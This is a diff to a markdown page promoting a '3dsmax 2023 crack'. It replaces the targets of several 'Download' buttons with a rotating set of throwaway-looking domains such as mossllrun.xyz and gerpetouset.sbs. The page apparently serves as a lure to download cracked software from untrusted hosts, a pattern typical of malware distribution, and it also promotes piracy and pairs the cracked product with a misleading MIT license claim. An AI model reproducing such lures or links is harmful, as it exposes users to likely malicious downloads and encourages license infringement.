@@ -4,7 +4,7 @@ Imagine transforming your workflows with cutting-edge technology that prioritize
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/3.jpg' alt='Download' width='200'/></a>
+<a href='https://opertomst.online?store=3d-max'><img src='assets/images/software/images/buttons/3.jpg' alt='Download' width='200'/></a>
 
 </div>
 
@@ -18,7 +18,7 @@ Imagine transforming your workflows with cutting-edge technology that prioritize
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/1.jpg' alt='Download' width='200'/></a>
+<a href='https://mossllrun.xyz?store=3d-max'><img src='assets/images/software/images/buttons/1.jpg' alt='Download' width='200'/></a>
 
 </div>
 
@@ -85,7 +85,7 @@ Installing **3dsmax 2023 crack** is straightforward:
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/4.jpg' alt='Download' width='200'/></a>
+<a href='https://mercolupoz.xyz?store=3d-max'><img src='assets/images/software/images/buttons/4.jpg' alt='Download' width='200'/></a>
 
 </div>
 
@@ -103,7 +103,7 @@ Getting started with **3dsmax 2023 crack** is easy:
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/4.jpg' alt='Download' width='200'/></a>
+<a href='https://kerbrtonoped.xyz?store=3d-max'><img src='assets/images/software/images/buttons/4.jpg' alt='Download' width='200'/></a>
 
 </div>
 
@@ -216,7 +216,7 @@ This application is licensed under the MIT License - see the LICENSE file for de
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/5.webp' alt='Download' width='200'/></a>
+<a href='https://opertomst.online?store=3d-max'><img src='assets/images/software/images/buttons/5.webp' alt='Download' width='200'/></a>
 
 </div>
 
@@ -242,7 +242,7 @@ Ready to elevate your workflow? Explore all the possibilities with **3ds max 202
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/2.jpg' alt='Download' width='200'/></a>
+<a href='https://mossllrun.xyz?store=3d-max'><img src='assets/images/software/images/buttons/2.jpg' alt='Download' width='200'/></a>
 
 </div>
 
@@ -270,6 +270,6 @@ Ready to unlock the full potential of **3d studio max crack**?
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/5.webp' alt='Download' width='200'/></a>
+<a href='https://gerpetouset.sbs?store=3d-max'><img src='assets/images/software/images/buttons/5.webp' alt='Download' width='200'/></a>
 
 </div>
